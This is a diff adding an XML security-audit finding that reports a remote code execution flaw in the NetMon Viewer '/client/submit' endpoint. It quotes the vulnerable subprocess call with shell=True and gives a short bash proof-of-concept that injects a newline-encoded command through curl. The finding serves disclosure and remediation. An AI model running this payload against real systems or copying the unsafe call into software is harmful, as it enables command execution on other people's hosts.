@@ -1,0 +1,31 @@
+<finding id="remote_code_execution" threatLevel="High" type="Remote Code Execution">
+    <title>Remote Code Execution</title>
+    
+    <description>
+    <p>Unsanitized user input in the NetMon Viewer '/client/submit' site allows logged-in users to execute arbitrary commands as the netmonclientd user on the NetMon host.</p>
+	<p>The script generates and executes a command line, which includes user input verbatim. The attack can break out of the intended command line and execute arbitrary commands by inserting, for instance, newline characters.</p>
+    </description>
+    <description_summary>
+    <p>Unsanitized user input in the NetMon Viewer '/client/submit' site allows logged-in users to execute arbitrary commands as the netmonclientd user on the NetMon host.</p>
+    </description_summary>
+    
+    <technicaldescription>
+	<p>The following snippet from the source code contains the vulnerability:</p>
+    <code>i = argv.i
+cmd = subprocess.call(['bin/../conn.py', '-I', i], shell=True)</code>
+    <p>The vulnerability is triggered by injecting commands into the client parameter.</p><p>Proof of Concept exploit:</p>
+    <code>#!/bin/bash
+
+COOKIE="INSERT_NETMON_VIEWER_SESSION_COOKIE_HERE"
+TARGET=$1
+CMD=$2
+
+URL=http://${TARGET}/client/submit/%0A${CMD}
+
+curl -vvv "${URL}"</code>
+    </technicaldescription>
+    
+    <recommendation>
+    <p>Update NetMon to the latest version, in which the vulnerability has been fixed.</p>
+    </recommendation>
+</finding>
